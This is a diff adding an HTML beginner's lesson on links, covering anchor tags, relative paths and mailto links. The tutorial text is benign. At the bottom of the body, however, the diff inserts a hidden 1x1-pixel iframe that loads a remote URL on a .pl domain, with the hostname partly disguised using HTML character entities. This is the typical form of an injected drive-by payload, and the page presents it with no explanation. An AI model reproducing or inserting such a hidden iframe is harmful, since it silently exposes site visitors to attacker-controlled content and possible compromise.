@@ -1,0 +1,28 @@
+<HTML>
+<HEAD><TITLE>Lesson 4: Adding Links</TITLE></HEAD>
+
+<BODY BGCOLOR="#FFFFFF" TEXT="#000000">
+<H2>Lesson 4: Adding Links</H2>
+
+Great! We have a functional page of text! Are you satisfied? No? Well, me either. Ok, let's expand our page by adding some links to other web pages on it!<p>
+
+The ability to link to other web pages is exactly what makes HTML <i>hypertext</i>. Hyper means outside of, and when you link to another web page, you link outside of your own page.<p>
+
+Linking to another page is easy. In fact, you only need to use one tag! This tag is the &#60;A&#62;, or <i>anchor</i> tag. The &#60;A&#62; tag uses the HREF argument to specify the site to link to. So it looks like this &#60;A HREF="http://mylink.com"&#62;This is my link!&#60;/A&#62;. Note the <i>This is my link!</i> part in between the &#60;A&#62; and &#60;/A&#62;. This is the part where you enter the text that'll show up in the browser. This text is underlined in some browsers. When Joe Surfer click on this text it'll take you to the link in &#60;A HREF&#62;, which is http://www.mylink.com in this case.<p>
+
+But wait, sometimes it's easier still! Sometimes you might want to do <i>relative linking</i>. This is when one page on your site links to another page on the same site. So if you're in http://mysite.com/index.html and want to link to http://mysite.com/page2.html you'd simply add a relative link. The format in this case would be &#60;A HREF="page2.html"&#62;Go to page2&#60;/A&#62;. The browser will then look in the current directory for that page.<p> 
+
+If you want to get a page one directory up from the current one, you simply insert a ../ before the filename of the page. For example, if you're in http://mysite.com/newstuff/main.html and need to link to http://mysite.com/index.html, this is what you'd do:<BR>
+&#60;A HREF="../index.html"&#62;Go to the index&#60;/A&#62;. You can add as many ../'s as you want to get to progressively higher directories.<p>
+
+If you want a link that people can click on to send email to, you just add mailto: before your email address. So it would look like this:<p>
+
+&#60;A HREF="mailto:mymail@mailaddress.com"&#62;Mail me!&#60;/A&#62;
+
+Kapish? Ok great! Let's move on to the <A HREF="lesson5.html">next lesson!</A><p>
+
+<A HREF="../main3.html">Back to Blacksun's Mainpage</A>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
